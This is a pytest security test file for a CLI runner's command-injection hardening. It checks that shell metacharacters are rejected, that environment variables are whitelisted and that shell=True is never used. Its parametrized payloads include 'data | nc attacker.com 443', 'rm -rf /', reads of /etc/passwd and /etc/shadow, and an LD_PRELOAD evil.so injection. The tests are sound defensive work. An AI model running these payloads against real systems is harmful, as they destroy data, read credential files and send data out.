"""Security tests for CliRunner — command injection hardening (Brimley 0.7, B07-S10).

Payloads drawn from PayloadAllTheThings (command injection category).
Each payload MUST be rejected or safely neutralized — no subprocess spawned.
"""

from __future__ import annotations

from typing import Any
from unittest.mock import AsyncMock, patch

import pytest

from brimley.core.context import BrimleyContext
from brimley.core.models import CliFunction
from brimley.execution.cli_runner import CliRunner, _validate_arg_no_metachar
from brimley.utils.diagnostics import BrimleyExecutionError


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_func(**kwargs: Any) -> CliFunction:
    defaults = {
        "name": "test_cli",
        "type": "cli_function",
        "return_shape": "string",
        "command": "echo",
        "timeout_seconds": 10.0,
    }
    defaults.update(kwargs)
    return CliFunction(**defaults)


# ---------------------------------------------------------------------------
# _validate_arg_no_metachar — unit tests
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "payload",
    [
        # Semicolon command chaining
        "; ls",
        "arg; rm -rf /",
        # Pipe chaining
        "| cat /etc/passwd",
        "data | nc attacker.com 443",
        # Background execution
        "& whoami",
        "arg & id",
        # Backtick substitution
        "`whoami`",
        "`id`",
        # $() substitution
        "$(id)",
        "$(cat /etc/shadow)",
        # Redirect / output capture
        "> /tmp/out",
        "< /dev/urandom",
        # Newline injection
        "arg\nid",
        "arg\rid",
        # Dollar sign in general (env var injection)
        "$PATH",
        "${IFS}",
    ],
)
def test_validate_arg_metachar_rejects_payload(payload: str) -> None:
    with pytest.raises(BrimleyExecutionError, match="metacharacter"):
        _validate_arg_no_metachar(payload, "test_func")


def test_validate_arg_clean_value_passes() -> None:
    """Safe argument values must not raise."""
    _validate_arg_no_metachar("alice", "fn")
    _validate_arg_no_metachar("--user=alice", "fn")
    _validate_arg_no_metachar("/tmp/file.txt", "fn")
    _validate_arg_no_metachar("value with spaces", "fn")
    _validate_arg_no_metachar("key=value", "fn")
    _validate_arg_no_metachar("123.456", "fn")


# ---------------------------------------------------------------------------
# CliRunner.run — injection via template variables
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "user_input",
    [
        "; ls",
        "| cat /etc/passwd",
        "`whoami`",
        "$(id)",
        "\nid",
        "\rid",
        "> /tmp/pwned",
    ],
)
def test_cli_runner_rejects_injection_in_template_arg(user_input: str) -> None:
    """Injection via a user-controlled template variable must be rejected."""
    func = _make_func(command_arguments=["{{ user_input }}"])
    context = BrimleyContext()
    runner = CliRunner()

    with patch.object(runner, "_async_exec", new=AsyncMock(return_value=(0, b"ok", b""))):
        with pytest.raises(BrimleyExecutionError, match="metacharacter"):
            runner.run(func, {"user_input": user_input}, context)


def test_cli_runner_rejects_path_traversal_in_arg() -> None:
    """Path traversal in rendered args must be caught by metachar validation."""
    # Percent-encoded traversal does not contain metacharacters — but raw ../../
    # is not a shell metacharacter; it's safe to pass to exec (no shell expansion).
    # The real defence is the arg list + shell=False.  This confirms clean values pass.
    func = _make_func(command_arguments=["../../etc/passwd"])
    context = BrimleyContext()
    runner = CliRunner()

    with patch.object(runner, "_async_exec", new=AsyncMock(return_value=(0, b"ok", b""))):
        # Path traversal without metacharacters should NOT be rejected by metachar check.
        # The security guarantee is that shell=False prevents shell interpretation.
        result = runner.run(func, {}, context)
    assert result == "ok"


# ---------------------------------------------------------------------------
# Environment variable injection
# ---------------------------------------------------------------------------


def test_cli_runner_env_whitelist_prevents_ld_preload_injection() -> None:
    """When env: is declared, LD_PRELOAD from the parent is NOT inherited."""
    import os

    func = _make_func(env={"MY_VAR": "safe_value"})
    context = BrimleyContext()
    runner = CliRunner()

    captured: dict = {}

    async def fake_exec(f, rendered_args, subprocess_env, cwd):
        captured["env"] = subprocess_env
        return (0, b"ok", b"")

    # Simulate LD_PRELOAD being present in parent environment
    original_ld = os.environ.get("LD_PRELOAD")
    os.environ["LD_PRELOAD"] = "/tmp/evil.so"
    try:
        with patch.object(runner, "_async_exec", side_effect=fake_exec):
            runner.run(func, {}, context)
    finally:
        if original_ld is None:
            os.environ.pop("LD_PRELOAD", None)
        else:
            os.environ["LD_PRELOAD"] = original_ld

    # Only explicitly declared keys should be in the subprocess env
    assert "LD_PRELOAD" not in captured["env"]
    assert captured["env"] == {"MY_VAR": "safe_value"}


def test_cli_runner_env_omitted_inherits_parent() -> None:
    """When env: is omitted, parent environment IS inherited (convenience mode)."""
    import os

    func = _make_func()  # no env: declared
    context = BrimleyContext()
    runner = CliRunner()

    captured: dict = {}

    async def fake_exec(f, rendered_args, subprocess_env, cwd):
        captured["env"] = subprocess_env
        return (0, b"ok", b"")

    with patch.object(runner, "_async_exec", side_effect=fake_exec):
        runner.run(func, {}, context)

    # Parent PATH should be present in inherited env
    assert "PATH" in captured["env"]


# ---------------------------------------------------------------------------
# Shell=False enforcement (structural / static)
# ---------------------------------------------------------------------------


def test_cli_runner_does_not_use_shell_true() -> None:
    """Static check: cli_runner source must not contain shell=True."""
    import inspect
    import brimley.execution.cli_runner as cli_module

    source = inspect.getsource(cli_module)
    assert "shell=True" not in source, (
        "cli_runner.py must NEVER use shell=True — command injection risk."
    )


def test_cli_runner_uses_create_subprocess_exec() -> None:
    """Static check: cli_runner must use create_subprocess_exec (not shell)."""
    import inspect
    import brimley.execution.cli_runner as cli_module

    source = inspect.getsource(cli_module)
    assert "create_subprocess_exec" in source
    assert "create_subprocess_shell" not in source
